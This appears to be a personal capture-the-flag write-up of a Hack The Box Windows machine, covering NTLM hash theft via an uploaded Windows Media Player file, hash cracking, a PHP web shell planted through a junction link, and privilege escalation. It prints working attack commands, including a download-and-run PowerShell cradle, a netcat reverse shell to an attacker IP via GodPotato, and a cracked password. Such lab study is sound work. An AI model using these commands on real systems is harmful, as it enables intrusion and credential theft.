---
cover: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9fc00b04-9a27-4db7-a521-e4eb36ff2c5b.png
status: SOLVED
type: windows
level: "2"
---
# lessons i need to learn from this box:
1. вот я столкнулся с тем что я прошелся по всему playbook-у для file upload атаки. но вот у меня не было того что я должен был проверить через что возможно будет проходить этот файл. чем обрабатываться... 
2. я когда получил первоначальный доступ я какую-то херню начал проверять. не было чего-то нормально свормированного что ли. надо было домашнуюю директорию проверить. я этого не сделал... также надо было директорию приложения.
3. вот я нашел эксплойт для SeTcbPrivilege но я начал его вслепую запускать. я никогда не встречался с этим говном. надо было почитать больше, что это делает, а не сидеть и запускать эксплой. просто надо было поменять имя процесса... 



# Enumeration
```bash
nmap -sC -sV -vv 10.129.234.67
```

output:
```
PORT     STATE SERVICE       REASON          VERSION
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: ProMotion Studio
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2026-09-26T04:18:28+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2026-09-26T04:18:23+00:00
| ssl-cert: Subject: commonName=MEDIA
| Issuer: commonName=MEDIA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-25T04:15:58
| Not valid after:  2027-03-27T04:15:58
| MD5:     c066 1763 d8df d5c2 bc68 995a bac3 e368
| SHA-1:   36d2 a5bf cf67 fa14 dcd7 2361 1b6b f1df 994a ecc8
| SHA-256: 5a89 53b8 3573 2116 c6ba a122 bcd8 2f34 1dc3 5eb1 d5c1 80d3 a819 24ba bf6e 5612
| -----BEGIN CERTIFICATE-----
| MIICzjCCAbagAwIBAgIQdv5e1igmk7ZB5y4SfyOYyDANBgkqhkiG9w0BAQsFADAQ
| MQ4wDAYDVQQDEwVNRURJQTAeFw0yNjA5MjUwNDE1NThaFw0yNzAzMjcwNDE1NTha
| MBAxDjAMBgNVBAMTBU1FRElBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAya0X2hO2W0V65lnd3hR9QBbCetwiuUSAmpEFtE3X8Q3sdfxjfYKRjVYjuxT8
| 8cl4omTG7fy5/YlGEf8Ws7eMJClKHrmrRGO7LjdsgvfR0arzUxgRUZVEo+dXfUow
| CZcXBeBh3jyJITBPg4CadluHXhwI0eF8Eq1aMTDzx7za5D3GQSeNnCrXbndafygF
| zgZZf6oMDpRDJrgJTG+sydb17BpLCCRZ56N1opAOs3UJPxzP/wSP2r56007mzAGA
| 7hfRCCXW9C/yLuPJlBJ6ehOjVQwP5XY36gNgCbKDKvgksnc0i43riGSrMC97sEjD
| WOdIHhPDYbm3Q25Vc0ahACzSVQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAAekCpWJR93aN+L76N6s
| OzP5bQVF+wohYS3SoK5vENbNRgxZo28kULnP/iHm5ZvXqqwXtBGV3cnIwc8DzXh7
| 8m1yr2eXVaacJx01ojF55beumiGCfvJZ9pclutmg6SjQIa15gTZx4F+S5woC2XkN
| kbu9uQYLajEWz/KpaS0MaFclX6k9rhWezT1/7A1Bj5lbMLy7qGx/jdaQkiZDeJL5
| YgOGLxJMLzo6COt6jFPNezwBMzjv4Qh4TLChsPBMCBK44v1WUI7ASBbgEb0UHNI8
| DsSZ9X+PdMZQspLDdoliTZ9N4zfZSf0/R5+bWRCV/BmbjF8igbXWROS4mxs9Z5uK
| mEs=
|_-----END CERTIFICATE-----
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

so we have windows system with 3 ports open:
* ssh - 22
* http - 80
* rdp - 3389

let's enum web:

### web
![[Pasted image 20260926072341.png]]
at the first glance just static website

but on the bottom 
![[Pasted image 20260926072413.png]]
upload functionality...

i put just .txt file and it was accepted
![[Pasted image 20260926073105.png]]

fuzz for dirs:
```bash
ffuf -u http://10.129.234.67/FUZZ -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

nothing usefull here:
![[Pasted image 20260926074248.png]]



---
# Initiall access
![[Pasted image 20260926080028.png]]
 
there is some `Windows Media Player` on the backend. so lets investigate a little more...

i found this article - https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/ that talking about this vulnerability  Microsoft Media Player – NTLM Leak via Legacy Player Files. let's try it's out...

so let's create new file called ntlm.wax:
![[Pasted image 20260926082012.png]]

and let's set up responder and upload it...
```bash
sudo responder -I tun1
```

upload it and wait
![[Pasted image 20260926081849.png]]


and in 3 minutes i got this
```bash
[SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:8239445ab5b0601e:E02EB5A08507E1C98E6A44DECC1B73CA:010100000000000080C4E3E38F4DDD01CF65AA04DD89EEAC0000000002000800550044003400550001001E00570049004E002D004F005100360038004F0049004A004E004F003100460004003400570049004E002D004F005100360038004F0049004A004E004F00310046002E0055004400340055002E004C004F00430041004C000300140055004400340055002E004C004F00430041004C000500140055004400340055002E004C004F00430041004C000700080080C4E3E38F4DDD010600040002000000080030003000000000000000000000000030000086B2523D47DBF64B7C034CB25D55C05FD8DA4110B5AE77896992EE35F537F0F10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00380035000000000000000000                                  
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox
```
so lets try to crack it...

write it to the file first:
```bash
echo "enox::MEDIA:8239445ab5b0601e:E02EB5A08507E1C98E6A44DECC1B73CA:010100000000000080C4E3E38F4DDD01CF65AA04DD89EEAC0000000002000800550044003400550001001E00570049004E002D004F005100360038004F0049004A004E004F003100460004003400570049004E002D004F005100360038004F0049004A004E004F00310046002E0055004400340055002E004C004F00430041004C000300140055004400340055002E004C004F00430041004C000500140055004400340055002E004C004F00430041004C000700080080C4E3E38F4DDD010600040002000000080030003000000000000000000000000030000086B2523D47DBF64B7C034CB25D55C05FD8DA4110B5AE77896992EE35F537F0F10A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00380035000000000000000000" > hash
```

then 
```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

and it cracked it: so we have creds: **enox**:**1234virus@**

let's ssh in


---
# Privilege Escalation
let's chech home directory first
![[Pasted image 20260926095021.png]]


some  powershell script. lets open it:
```powershell
function Get-Values {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateScript({Test-Path -Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    # Read the first line of the file
    $firstLine = Get-Content $FilePath -TotalCount 1

    # Extract the values from the first line
    if ($firstLine -match 'Filename: (.+), Random Variable: (.+)') {
        $filename = $Matches[1]
        $randomVariable = $Matches[2]

        # Create a custom object with the extracted values
        $repoValues = [PSCustomObject]@{
            FileName = $filename
            RandomVariable = $randomVariable
        }

        # Return the custom object
        return $repoValues
    }
    else {
        # Return $null if the pattern is not found
        return $null
    }
}

function UpdateTodo {
    param (
        [Parameter(Mandatory = $true)]
        [ValidateScript({Test-Path -Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    # Create a .NET stream reader and writer
    $reader = [System.IO.StreamReader]::new($FilePath)
    $writer = [System.IO.StreamWriter]::new($FilePath + ".tmp")

    # Read the first line and ignore it
    $reader.ReadLine() | Out-Null

    # Copy the remaining lines to a temporary file
    while (-not $reader.EndOfStream) {
        $line = $reader.ReadLine()
        $writer.WriteLine($line)
    }

    # Close the reader and writer
    $reader.Close()
    $writer.Close()

    # Replace the original file with the temporary file
    Remove-Item $FilePath
    Rename-Item -Path ($FilePath + ".tmp") -NewName $FilePath
}

$todofile="C:\\Windows\\Tasks\\Uploads\\todo.txt"
$mediaPlayerPath = "C:\Program Files (x86)\Windows Media Player\wmplayer.exe"


while($True){

    if ((Get-Content -Path $todofile) -eq $null) {
        Write-Host "Todo is empty."
        Sleep 60 # Sleep for 60 seconds before rechecking
    }
    else {
        $result = Get-Values -FilePath $todofile
        $filename = $result.FileName
        $randomVariable = $result.RandomVariable
        Write-Host "FileName: $filename"
        Write-Host "Random Variable: $randomVariable"

        # Opening the File in Windows Media Player
        Start-Process -FilePath $mediaPlayerPath -ArgumentList "C:\Windows\Tasks\uploads\$randomVariable\$filename"

        # Wait for 15 seconds
        Start-Sleep -Seconds 15

        $mediaPlayerProcess = Get-Process -Name "wmplayer" -ErrorAction SilentlyContinue
        if ($mediaPlayerProcess -ne $null) {
            Write-Host "Killing Windows Media Player process."
            Stop-Process -Name "wmplayer" -Force
        }

        # Task Done
        UpdateTodo -FilePath $todofile # Updating C:\Windows\Tasks\Uploads\todo.txt
        Sleep 15
    }

}
```
this script is handles previous functionality with review uploads..

found index.php script that handle file uploads
```php
<?php
error_reporting(0);

    // Your PHP code for handling form submission and file upload goes here.
    $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory

    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
        $firstname = filter_var($_POST["firstname"], FILTER_SANITIZE_STRING);
        $lastname = filter_var($_POST["lastname"], FILTER_SANITIZE_STRING);
        $email = filter_var($_POST["email"], FILTER_SANITIZE_STRING);

        // Create a folder name using the MD5 hash of Firstname + Lastname + Email
        $folderName = md5($firstname . $lastname . $email);

        // Create the full upload directory path
        $targetDir = $uploadDir . $folderName . '/';

        // Ensure the directory exists; create it if not
        if (!file_exists($targetDir)) {
            mkdir($targetDir, 0777, true);
        }

        // Sanitize the filename to remove unsafe characters
        $originalFilename = $_FILES["fileToUpload"]["name"];
        $sanitizedFilename = preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename);


        // Build the full path to the target file
        $targetFile = $targetDir . $sanitizedFilename;

        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            echo "<script>alert('Your application was successfully submitted. Our HR shall review your video and get back to you.');</script>";

            // Update the todo.txt file
            $todoFile = $uploadDir . 'todo.txt';
            $todoContent = "Filename: " . $originalFilename . ", Random Variable: " . $folderName . "\n";

            // Append the new line to the file
            file_put_contents($todoFile, $todoContent, FILE_APPEND);
        } else {
            echo "<script>alert('Uh oh, something went wrong... Please submit again');</script>";
        }
    }
    ?>
```

so the idea is next:
1. we now that folder creates based on firstname, lastname and email and then md5 all three of that.
2. we can upload test file. then delete it. and create directory link to web app dir.
3. then we upload shell.php with the same firstname, lastname and email. this shell will be written to our created link that points to webapp directory.
4. then we can get rce from webapp...

folder created
![[Pasted image 20260926110539.png]]

delete it
```
rm 737ec3862b91864fbac6845f2b7101fd
```

create link
```powershell
cmd /c mklink /J 737ec3862b91864fbac6845f2b7101fd  C:\xampp\htdocs\
```
![[Pasted image 20260926110623.png]]

then upload shell.php file. 
```php
<?php system($_REQUEST['cmd']); ?>
```

it will be in webapp directory.
![[Pasted image 20260926110658.png]]

then we can get reverse shell. lets generate powershell payload first
![[Pasted image 20260926110803.png]]

next open this
```
http://10.129.234.67/shell2.php?cmd=powershell.exe -e <base_64_payload>
```

and we got in
![[Pasted image 20260926110849.png]]


### SeTcbPrivilege

i have next privileges
![[Pasted image 20260926111238.png]]

but its disabled... but we can enable it.

first we have to download it to our system - https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

next upload to victims
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.85/EnableAllTokenPrivs.ps1')
```

now we can exploit it.

so we have this article on how to exploit this privilege - https://0xss0rz.gitbook.io/0xss0rz/pentest/privilege-escalation/windows/user-privileges#setcbprivilege

firstly u need to download this script - https://github.com/b4lisong/SeTcbPrivilege-Abuse/blob/main/TcbElevation.cpp

second build it
```bash
x86_64-w64-mingw32-g++ TcbElevation.cpp -o TcbElevation.exe -lsecur32 -municode -static
```

now we need to transfer this binary and execure it like this
```powershell
./TcbElevation.exe giveadmin "net localgroup Administrators enox /add"
```
> firstly i tried to give me new revshell, but that was shitty idea...

so we need to reset our ssh connection with enox
![[Pasted image 20260927074322.png]]

and get the flag
![[Pasted image 20260927074338.png]]


---
# Beyond root

So the second user is service user. and what privilege service users have. it's `SeImpersonatePrivilege`... but for security reasons we have limited shell...

to bypass it i need to transfer this tool to the victim - https://github.com/itm4n/FullPowers

next we need to set up new listener on our target and run this:
```powershell
./FullPowers.exe -c "powershell -e <base64_payload>"
```

and we got new shell with new privileges:
![[Pasted image 20260927075230.png]]

so we can now exploit SeImpersonatePrivilege with potato family attacks...

### SeImpersonatePrivilege
i will use toll called [GodPotato](https://github.com/BeichenDream/GodPotato). download the latest release and run this.
```powershell
./GodPotato.exe -cmd "C:\Users\Public\nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.15.85 4446"
```

and we got new shell...
![[Pasted image 20260927075824.png]]
